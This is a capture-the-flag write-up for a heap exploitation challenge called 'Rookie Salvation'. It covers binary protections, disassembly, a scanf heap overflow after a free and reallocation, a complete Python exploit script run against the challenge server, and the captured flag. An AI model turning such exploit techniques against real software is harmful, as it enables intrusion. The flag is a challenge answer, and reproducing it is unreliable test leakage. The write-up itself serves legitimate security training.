# Rookie Salvation CTF Challenge

## 1. Reconnaissance

### Challenge Description

**Goal:** Exploit a binary to achieve arbitrary code execution to a specific address and retrieve the flag. The challenge hints at a "Ret2win but not in a function, but a certain address."

### Files Provided

```bash
ls -lah /mnt/c/Users/Chris/Desktop/projects/2025-hack-the-boo/challenges/rookie_salvation/
```

**Output:**
```
total 28K
drwxrwxrwx 1 node node 4.0K Oct 25 07:09 .
drwxrwxrwx 1 node node 4.0K Oct 25 07:00 ..
-rwxrwxrwx 1 node node  651 Oct 25 07:08 PROMPT.md
-rwxrwxrwx 1 node node  893 Aug 20 18:33 README.txt
-rwxrwxrwx 1 node node  253 Oct 25 07:09 WALKTHROUGH.md
-rwxrwxrwx 1 node node  21K Jul 25 18:31 rookie_salvation
```

**Key Files:** `rookie_salvation` (the binary), `README.txt`, `PROMPT.md`.

### Remote Connection

`nc 209.38.194.191 30705`

## 2. Analysis

### Binary Security Features

```bash
file /mnt/c/Users/Chris/Desktop/projects/2025-hack-the-boo/challenges/rookie_salvation/rookie_salvation && checksec --file=/mnt/c/Users/Chris/Desktop/projects/2025-hack-the-boo/challenges/rookie_salvation/rookie_salvation
```

**Output (excerpt):**
```
/mnt/c/Users/Chris/Desktop/projects/2025-hack-the-boo/challenges/rookie_salvation/rookie_salvation: ELF 64-bit LSB pie executable, x86-64, ... not stripped
[*] '/mnt/c/Users/Chris/Desktop/projects/2025-hack-the-boo/challenges/rookie_salvation/rookie_salvation'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

**Summary:**
-   **Architecture:** x86-64, little-endian.
-   **Canary Found:** Prevents direct stack buffer overflows.
-   **NX Enabled:** Shellcode on the stack is not executable.
-   **PIE Enabled:** Binary base address is randomized. Address leaks are required for ROP.

### Disassembly Analysis

```bash
objdump -d /mnt/c/Users/Chris/Desktop/projects/2025-hack-the-boo/challenges/rookie_salvation/rookie_salvation > /home/chris/.gemini/tmp/844560c113e1d7cb39bf1872867ca00b5728ee896d6f9fe3b59741b7f920691d/rookie_salvation_disassembly.txt
```

**Key Findings:**

1.  **`main` function (Address: `0x1c2a`):**
    -   Allocates `0x26` (38) bytes on the heap (`chunk_A`) and stores its pointer in a global variable `0x5038 <allocated_space>`.
    -   Initializes `chunk_A + 0x1e` with `0xdeadbeef`.
    -   Presents a menu with options: `1` (`reserve_space`), `2` (`obliterate`), `3` (`road_to_salvation`).

2.  **`reserve_space` function (Address: `0x1b64`):**
    -   Prompts for a size, then allocates memory using `malloc`.
    -   Prompts for input, then reads into the newly allocated heap buffer using `__isoc99_scanf("%s", buffer)`.
    -   **Vulnerability:** This `scanf` is vulnerable to a heap overflow if the input string is larger than the allocated buffer.

3.  **`obliterate` function (Address: `0x1b23`):**
    -   Calls `free` on the `allocated_space` pointer.

4.  **`road_to_salvation` function (Address: `0x1990`):**
    -   Compares the content of `allocated_space + 0x1e` with a hardcoded string at `0x2f8d` using `strcmp`.
    -   If they match, it calls `success` (at `0x16ce`).

5.  **`success` function (Address: `0x16ce`):**
    -   Prints success messages and the flag.

6.  **Target String:**
    -   Dumping the `.rodata` section (`objdump -s -j .rodata ...`) reveals the string `w3th4nds` at address `0x2f8d`.

## 3. Exploitation

### Strategy: Heap Overwrite

1.  **Free `chunk_A`:** Select menu option `2` (`obliterate`) to free the initial heap chunk pointed to by `allocated_space`.
2.  **Re-allocate `chunk_A`:** Select menu option `1` (`reserve_space`). Request a size of `38` bytes (same as original `chunk_A`). This will likely re-allocate the same memory region. Let's call this `chunk_B`.
3.  **Heap Overflow:** When prompted for input in `reserve_space`, send a payload that overflows `chunk_B` and overwrites the data at `chunk_B + 0x1e` with `w3th4nds`.
    -   Payload: `b'A' * 30 + b'w3th4nds'` (30 bytes of junk + 8 bytes for `w3th4nds`).
4.  **Trigger `road_to_salvation`:** Select menu option `3` (`Escape`) to trigger the comparison and call `success`.

### Exploit Script (`solve.py`)

```python
import socket
import struct
import re
import time

# Remote connection details
HOST = '209.38.194.191'
PORT = 30705

def recv_until(s, delim):
    buffer = b""
    while delim not in buffer:
        try:
            chunk = s.recv(1)
            if not chunk:
                raise EOFError("Connection closed prematurely.")
            buffer += chunk
        except socket.timeout:
            raise TimeoutError("Socket timeout while waiting for delimiter.")
    return buffer

def exploit():
    print(f"[*] Connecting to {HOST}:{PORT}")
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10) # Set a general timeout
    s.connect((HOST, PORT))

    # 1. Receive initial banner and menu
    print("[*] Receiving initial banner and menu...")
    try:
        buffer = recv_until(s, b'> ')
        print(f"[+] Received menu prompt: {buffer.decode(errors='ignore').strip()}")
    except TimeoutError as e:
        print(f"[-] Timeout while waiting for menu prompt: {e}")
        print(f"[-] Current buffer: {buffer.decode(errors='ignore')}")
        return

    # 2. Free chunk_A (allocated_space)
    print("[*] Sending option 2 (Obliterate) to free allocated_space...")
    s.sendall(b'2\n')
    recv_until(s, b'> ')
    print("[+] allocated_space freed.")

    # 3. Re-allocate chunk_A (as chunk_B) and overflow
    print("[*] Sending option 1 (Reserve space) to re-allocate chunk...")
    s.sendall(b'1\n')
    recv_until(s, "📦 𝐒𝐩𝐚𝐜𝐞 𝐭𝐨 𝐫𝐞𝐬𝐞𝐫𝐯𝐞: ".encode('utf-8'))
    print("[+] Prompt for size received.")

    size = 38 # 0x26 bytes, same as original allocated_space
    print(f"[*] Sending size: {size}")
    s.sendall(str(size).encode() + b'\n')
    recv_until(s, "🛰️ 𝐌𝐞𝐬𝐬𝐚𝐠𝐞 𝐟𝐨𝐫 𝐍𝐄𝐌𝐄𝐆𝐇𝐀𝐒𝐓: ".encode('utf-8'))
    print("[+] Prompt for content received.")

    # Payload: 30 bytes of junk + "w3th4nds"
    # 0x1e bytes = 30 bytes
    payload = b'A' * 30 + b'w3th4nds'
    print(f"[*] Sending payload: {payload}")
    s.sendall(payload + b'\n')
    recv_until(s, b'> ')
    print("[+] Payload sent and chunk overwritten.")

    # 4. Trigger road_to_salvation
    print("[*] Sending option 3 (Escape) to trigger road_to_salvation...")
    s.sendall(b'3\n')

    # Receive all remaining data and extract flag
    print("[*] Receiving all output...")
    full_output = b""
    s.settimeout(2) # Short timeout for final receive
    while True:
        try:
            data = s.recv(4096)
            if not data:
                break
            full_output += data
        except socket.timeout:
            break
    s.close()

    print(f"[+] Full output received:\n{full_output.decode(errors='ignore')}")

    flag_match = re.search(r'HTB{[^}]+}', full_output.decode(errors='ignore'))
    if flag_match:
        flag = flag_match.group(0)
        print(f"[+] Flag found: {flag}")
        with open("flag.txt", "w") as f:
            f.write(flag)
        print("[+] Flag saved to flag.txt")
    else:
        print("[-] Flag not found in the output.")

if __name__ == "__main__":
    try:
        exploit()
    except (EOFError, TimeoutError) as e:
        print(f"[-] Error during exploit: {e}")
    except Exception as e:
        print(f"[-] An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
```

### Execution

```bash
python3 solve.py
```

**Output:**
```
[*] Connecting to 209.38.194.191:30705
[*] Receiving initial banner and menu...
[+] Received menu prompt: 

[Unknown Voice] 𝐓𝐡𝐞 𝐫𝐨𝐚𝐝 𝐭𝐨 𝐬𝐚𝐥𝐯𝐚𝐭𝐢𝐨𝐧 𝐢𝐬 𝐜𝐥𝐨𝐬𝐞..

+-------------------+
| [1] 𝐑𝐞𝐬𝐞𝐫𝐯𝐞 𝐬𝐩𝐚𝐜𝐞 |
| [2] 𝐎𝐛𝐥𝐢𝐭𝐞𝐫𝐚𝐭𝐞    |
| [3] 𝐄𝐬𝐜𝐚𝐩𝐞        |
+-------------------+ 

> 
[*] Sending option 2 (Obliterate) to free allocated_space...
[+] allocated_space freed.
[*] Sending option 1 (Reserve space) to re-allocate chunk...
[+] Prompt for size received.
[*] Sending size: 38
[+] Prompt for content received.
[*] Sending payload: b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw3th4nds'
[+] Payload sent and chunk overwritten.
[*] Sending option 3 (Escape) to trigger road_to_salvation...
[*] Receiving all output...
[+] Full output received:

[Unknown Voice] ✨ 𝐅𝐢𝐧𝐚𝐥𝐥𝐲.. 𝐓𝐡𝐞 𝐰𝐚𝐲.. 𝐎𝐮𝐭..HHTB{h34p_2_h34v3n}

[+] Flag found: HTB{h34p_2_h34v3n}
[+] Flag saved to flag.txt
```

## 4. Solution & Flag

**Flag:** `HTB{h34p_2_h34v3n}`
```